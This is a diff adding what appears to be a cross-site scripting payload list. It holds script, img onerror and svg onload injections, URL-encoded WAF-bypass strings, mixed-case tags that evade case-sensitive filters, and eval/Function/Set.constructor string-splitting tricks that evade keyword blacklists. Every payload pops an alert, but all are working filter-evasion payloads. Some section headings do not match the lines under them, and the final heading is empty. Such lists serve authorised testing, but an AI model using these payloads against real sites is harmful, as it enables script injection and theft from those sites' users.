@@ -1,0 +1,33 @@
+<script>alert("XSS")</script>
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+<img src=x onerror=alert("XSS")>
+<svg/onload=prompt(1)>
+<marquee><h1>XSS</h1></marquee>
+%22%3E%3Csvg/onload=alert(%27XSS_WAF_BYPASS_:-)%27)%3E">
+<svg/onload=alert('XSS_WAF_BYPASS_:-)')>
+
+#Bypass Case Sensitive
+
+<sCrIpt>alert(1)</ScRipt>
+<ScrIPt>alert(1)</ScRipT>
+
+#Bypass Tag Blacklist 
+<script x>
+<script x>alert('XSS')<script y>
+
+#BYpass Word Blacklist with code evaluation
+<script x>
+<script x>alert('XSS')<script y>
+
+#Bypass with Incomplete HTML Tag
+eval('ale'+'rt(0)');
+Function("ale"+"rt(1)")();
+new Function`al\ert\`6\``;
+setTimeout('ale'+'rt(2)');
+setInterval('ale'+'rt(10)');
+Set.constructor('ale'+'rt(13)')();
+Set.constructor`al\x65rt\x2814\x29```;
+
+
+#Bypass Quotes for String 
